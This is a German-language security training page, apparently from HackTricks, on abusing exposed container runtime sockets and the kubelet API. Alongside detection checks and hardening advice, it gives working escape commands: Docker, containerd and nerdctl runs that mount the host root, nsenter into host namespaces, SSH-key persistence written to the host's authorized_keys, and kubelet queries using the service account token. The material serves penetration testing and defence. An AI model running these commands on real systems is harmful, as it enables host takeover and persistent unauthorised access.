# Runtime-API und Daemon-Exposition

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Viele reale Container-Kompromittierungen beginnen gar nicht mit einem namespace escape. Sie beginnen mit dem Zugriff auf die Runtime-Kontrollebene. Kann ein Workload über einen eingebundenen Unix-Socket oder einen exponierten TCP-Listener mit `dockerd`, `containerd`, CRI-O, Podman oder kubelet kommunizieren, kann der Angreifer möglicherweise einen neuen Container mit erweiterten Privilegien anfordern, das Host-Dateisystem einbinden, Host-Namespaces beitreten oder sensible Informationen über den Node abrufen. In solchen Fällen ist die Runtime-API die eigentliche Sicherheitsgrenze, und ihre Kompromittierung kommt praktisch einer Kompromittierung des Hosts gleich.

Deshalb sollte die Offenlegung von Runtime-Sockets getrennt von Kernel-Schutzmaßnahmen dokumentiert werden. Ein Container mit gewöhnlichem seccomp, Capabilities und MAC-Einschränkungen kann immer noch nur einen API-Aufruf von der Kompromittierung des Hosts entfernt sein, wenn `/var/run/docker.sock` oder `/run/containerd/containerd.sock` in ihn eingebunden ist. Die Kernel-Isolation des aktuellen Containers kann genau wie vorgesehen funktionieren, während die Runtime-Verwaltungsebene weiterhin vollständig exponiert ist.

## Zugriffsmodelle für Daemons

Docker Engine stellt seine privilegierte API traditionell über den lokalen Unix-Socket `unix:///var/run/docker.sock` bereit. Historisch wurde sie auch über TCP-Listener wie `tcp://0.0.0.0:2375` oder einen TLS-geschützten Listener auf `2376` remote verfügbar gemacht. Wird der Daemon remote ohne starkes TLS und Client-Authentifizierung exponiert, wird die Docker-API effektiv zu einer Remote-Root-Schnittstelle.

containerd, CRI-O, Podman und kubelet exponieren ähnlich weitreichende Angriffsflächen. Namen und Workflows unterscheiden sich, die Logik jedoch nicht. Ermöglicht die Schnittstelle dem Aufrufer, Workloads zu erstellen, Host-Pfade einzubinden, Zugangsdaten abzurufen oder laufende Container zu ändern, handelt es sich um einen privilegierten Verwaltungskanal, der entsprechend behandelt werden sollte.

Eine Web-UI für die Containerverwaltung kann dieselbe Sicherheitsgrenze exponieren, ohne dem lokalen Konto direkten Socket-Zugriff zu gewähren. Beispielsweise dokumentierte [Portainer issue #493](https://github.com/portainer/portainer/issues/493) das Zurücksetzen eines Administratorpassworts ohne Authentifizierung in einem älteren Build von Version 1.11.1. Betrachte eine lokal erreichbare UI nur als Ansatzpunkt für eine Prüfung: Bestätige den installierten Build und das Authentifizierungsverhalten, die tatsächlichen Administratorrechte und ob der verwaltete Endpunkt Container mit einem beschreibbaren Host-Bind-Mount erstellen kann. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket), dass die socketbasierte Verwaltung Zugriff auf den Docker-Socket erfordert; ein rootless oder eingeschränkter Endpunkt verändert die Auswirkungen auf den Host. Leite den Authentifizierungsfehler oder Root-Zugriff auf den Host nicht allein aus einem Prozessnamen, Port oder Versionsstring ab.

Häufige lokale Pfade, die überprüft werden sollten, sind:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Ältere oder speziellere Stacks können auch Endpoints wie `dockershim.sock`, `frakti.sock` oder `rktlet.sock` bereitstellen. Diese sind in modernen Umgebungen weniger verbreitet. Wenn sie jedoch vorkommen, sollten sie mit derselben Vorsicht behandelt werden, da sie Runtime-Steuerungsschnittstellen und keine gewöhnlichen Anwendungssockets darstellen.

## Secure Remote Access

Wenn ein Daemon über den lokalen Socket hinaus erreichbar sein muss, sollte die Verbindung mit TLS geschützt und vorzugsweise gegenseitig authentifiziert werden, sodass der Daemon den Client und der Client den Daemon verifiziert. Die alte Gewohnheit, den Docker-Daemon der Einfachheit halber über einfaches HTTP zu öffnen, ist einer der gefährlichsten Fehler bei der Containerverwaltung, da die API leistungsfähig genug ist, um direkt privilegierte Container zu erstellen.

Das historische Docker-Konfigurationsmuster sah so aus:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Auf systemd-basierten Hosts kann die Daemon-Kommunikation auch als `fd://` erscheinen. Das bedeutet, dass der Prozess einen von systemd vorab geöffneten Socket übernimmt, statt selbst direkt daran zu binden. Entscheidend ist nicht die genaue Syntax, sondern die Sicherheitsauswirkung. Sobald der Daemon über einen streng berechtigten lokalen Socket hinaus lauscht, sind Transportsicherheit und Client-Authentifizierung zwingend erforderlich und keine optionale Härtungsmaßnahme mehr.

## Missbrauch

Wenn ein Runtime-Socket vorhanden ist, prüfe, um welchen es sich handelt, ob ein kompatibler Client verfügbar ist und ob ein direkter Zugriff über HTTP oder gRPC möglich ist:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Diese Befehle sind nützlich, weil sie zwischen einem nicht vorhandenen Pfad, einem eingebundenen, aber nicht zugänglichen Socket und einer aktiven privilegierten API unterscheiden. Wenn der Client funktioniert, stellt sich als Nächstes die Frage, ob die API einen neuen Container mit einem Host-Bind-Mount oder gemeinsam genutzten Host-Namespaces starten kann.

### Wenn kein Client installiert ist

Dass `docker`, `podman` oder eine andere benutzerfreundliche CLI fehlt, bedeutet nicht, dass der Socket sicher ist. Docker Engine kommuniziert über seinen Unix-Socket per HTTP, und Podman stellt über `podman system service` sowohl eine Docker-kompatible API als auch eine native Libpod-API bereit. Daher reicht möglicherweise schon eine minimale Umgebung mit nur `curl`, um den Daemon anzusteuern:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Dies ist während der post-exploitation relevant, da Verteidiger manchmal die üblichen Client-Binaries entfernen, aber den Management-Socket gemountet lassen. Auf Podman-Hosts gilt: Der Pfad mit hohem Wert unterscheidet sich bei rootful- und rootless-Bereitstellungen: `unix:///run/podman/podman.sock` für rootful-Service-Instanzen und `unix://$XDG_RUNTIME_DIR/podman/podman.sock` für rootless-Instanzen.

### Vollständiges Beispiel: Vom Docker-Socket zu Root auf dem Host

Wenn `docker.sock` erreichbar ist, besteht der klassische Escape darin, einen neuen Container zu starten, der das Root-Dateisystem des Hosts mountet, und dann mit `chroot` dorthin zu wechseln:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Dies ermöglicht direkte Ausführung mit Host-root-Rechten über den Docker daemon. Die Auswirkungen beschränken sich nicht auf das Lesen von Dateien. Sobald der Angreifer im neuen Container ist, kann er Host-Dateien verändern, Zugangsdaten abgreifen, Persistenz einrichten oder weitere privilegierte Workloads starten.

### Vollständiges Beispiel: Vom Docker Socket zu Host-Namespaces

Wenn der Angreifer statt reinem Dateisystemzugriff lieber in Namespaces eintreten möchte:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Dieser Pfad erreicht den Host, indem die Runtime aufgefordert wird, einen neuen Container mit explizitem Zugriff auf Host-Namespaces zu erstellen, statt den aktuellen Container auszunutzen.

### Docker Socket Persistence Pattern

Runtime-Steuerung kann auch zur Persistenz statt für eine einmalige Shell verwendet werden. Das generische Muster besteht darin, einen Helper-Container mit einem Host-Mount zu erstellen, autorisiertes Zugriffsmaterial oder einen Startup-Hook in das gemountete Host-Dateisystem zu schreiben und anschließend zu überprüfen, ob der Host es verwendet.

Beispielaufbau:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Dieselbe Idee kann je nach gewünschtem Nachweis auf systemd-Units, cron-Fragmente, Anwendungsstartdateien oder SSH-Schlüssel abzielen. Wichtig ist, dass die persistente Änderung über die Dateisystemberechtigungen des Runtime-Daemons auf Host-Ebene vorgenommen wird und nicht durch zusätzliche Privilegien im ursprünglichen Container.

### Pivot über einen Helper und die direkte Docker-API

Wenn die Docker-CLI fehlt, lässt sich derselbe Host-Mount-Helper-Ablauf über HTTP über den Unix-Socket ausführen. Der allgemeine Ablauf ist: API bestätigen, einen Helper-Container mit einem Host-Bind-Mount erstellen, ihn starten, eine Exec-Instanz erstellen und diese Exec-Instanz starten.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Die abschließende Anfrage an `/exec/<id>/start` hängt von der zurückgegebenen Exec-ID ab. Der sicherheitsrelevante Punkt ist jedoch unabhängig von der genauen JSON-Verarbeitung: Der direkte API-Zugriff auf einen rootful Docker-Daemon reicht aus, um eine leistungsfähigere Hilfs-Workload anzufordern.

### Vollständiges Beispiel: containerd-Socket

Ein eingebundener `containerd`-Socket ist in der Regel genauso gefährlich:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Wenn ein Docker-ähnlicherer Client verfügbar ist, kann `nerdctl` praktischer als `ctr` sein, da es vertraute Flags wie `--privileged`, `--pid=host` und `-v` unterstützt:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Die Auswirkungen sind erneut eine Host-Kompromittierung. Selbst wenn Docker-spezifische Tools fehlen, kann eine andere Runtime-API weiterhin dieselben administrativen Möglichkeiten bieten. Auf Kubernetes-Knoten kann `crictl` für Reconnaissance und die Interaktion mit Containern ebenfalls ausreichen, da es direkt mit dem CRI-Endpunkt kommuniziert.

### BuildKit-Socket

`buildkitd` wird leicht übersehen, weil viele es für „nur das Build-Backend“ halten, doch der Daemon ist weiterhin eine privilegierte Control Plane. Ein erreichbarer `buildkitd.sock` kann einem Angreifer ermöglichen, beliebige Build-Schritte auszuführen, die Fähigkeiten der Worker zu untersuchen, lokale Kontexte aus der kompromittierten Umgebung zu verwenden und gefährliche Berechtigungen wie `network.host` oder `security.insecure` anzufordern, sofern der Daemon so konfiguriert wurde, dass er diese zulässt.

Nützliche erste Interaktionen sind:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Wenn der Daemon Build-Anfragen akzeptiert, teste, ob unsichere Entitlements verfügbar sind:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Die konkreten Auswirkungen hängen von der Daemon-Konfiguration ab, aber ein rootful BuildKit-Service mit permissiven Entitlements ist keine harmlose Entwickler-Bequemlichkeit. Behandle ihn als weitere hochwertige administrative Angriffsfläche, besonders auf CI-Runnern und gemeinsam genutzten Build-Knoten.

### Kubelet-API über TCP

Der kubelet ist keine Container-Runtime, aber dennoch Teil der Node-Management-Ebene und wird häufig im selben Vertrauensgrenzen-Kontext betrachtet. Wenn der sichere Port `10250` des kubelet aus dem Workload erreichbar ist oder Node-Credentials, kubeconfigs oder Proxy-Rechte offengelegt werden, kann der Angreifer möglicherweise Pods auflisten, Logs abrufen oder Befehle in node-lokalen Containern ausführen, ohne jemals den Admission-Pfad des Kubernetes-API-Servers zu durchlaufen.

Beginne mit einer einfachen Erkundung:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Wenn der kubelet- oder API-Server-Proxy-Pfad `exec` autorisiert, kann ein WebSocket-fähiger Client dadurch Code in anderen Containern auf dem Node ausführen. Deshalb ist `nodes/proxy` mit nur `get`-Berechtigung gefährlicher, als es klingt: Die Anfrage kann weiterhin kubelet-Endpunkte erreichen, die Befehle ausführen, und diese direkten kubelet-Interaktionen tauchen nicht in den normalen Kubernetes-Audit-Logs auf.<sup>[[2]](#references)</sup>

## Prüfungen

Mit diesen Prüfungen soll ermittelt werden, ob der Container eine Management Plane erreichen kann, die außerhalb der Vertrauensgrenze bleiben sollte.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Was hier interessant ist:

- Ein eingebundener Runtime-Socket ist normalerweise ein direktes Administrationsmittel und nicht bloß eine Möglichkeit zur Offenlegung von Informationen.
- Ein TCP-Listener auf `2375` ohne TLS sollte als Bedingung für eine Remote-Kompromittierung behandelt werden.
- Umgebungsvariablen wie `DOCKER_HOST` weisen oft darauf hin, dass der Workload absichtlich für die Kommunikation mit der Host-Runtime ausgelegt wurde.

## Runtime-Standardeinstellungen

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächungen |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig lokaler Unix-Socket | `dockerd` lauscht am lokalen Socket, und der Daemon läuft normalerweise rootful | `/var/run/docker.sock` einbinden, `tcp://...:2375` exponieren, schwaches oder fehlendes TLS auf `2376` |
| Podman | Standardmäßig daemonlose CLI | Für die gewöhnliche lokale Nutzung ist kein dauerhaft laufender privilegierter Daemon erforderlich; API-Sockets können dennoch exponiert werden, wenn `podman system service` aktiviert ist | `podman.sock` exponieren, den Dienst allgemein zugänglich machen, rootful API-Nutzung |
| containerd | Lokaler privilegierter Socket | Die administrative API wird über den lokalen Socket exponiert und normalerweise von übergeordneten Tools genutzt | `containerd.sock` einbinden, breiter Zugriff auf `ctr` oder `nerdctl`, privilegierte Namespaces exponieren |
| CRI-O | Lokaler privilegierter Socket | Der CRI-Endpunkt ist für vertrauenswürdige node-lokale Komponenten vorgesehen | `crio.sock` einbinden, den CRI-Endpunkt für nicht vertrauenswürdige Workloads exponieren |
| Kubernetes kubelet | Node-lokale Management-API | Der Kubelet sollte nicht allgemein aus Pods erreichbar sein; je nach Authentifizierung und Autorisierung kann der Zugriff Pod-Zustand, Zugangsdaten und Ausführungsfunktionen offenlegen | Kubelet-Sockets oder -Zertifikate einbinden, schwache Kubelet-Authentifizierung, Host-Netzwerkmodus plus erreichbarer Kubelet-Endpunkt |

## References

- [1] [Ausnutzung des containerd-Sockets, Teil 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Risiken durch Umgehung des Kubernetes API Servers](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
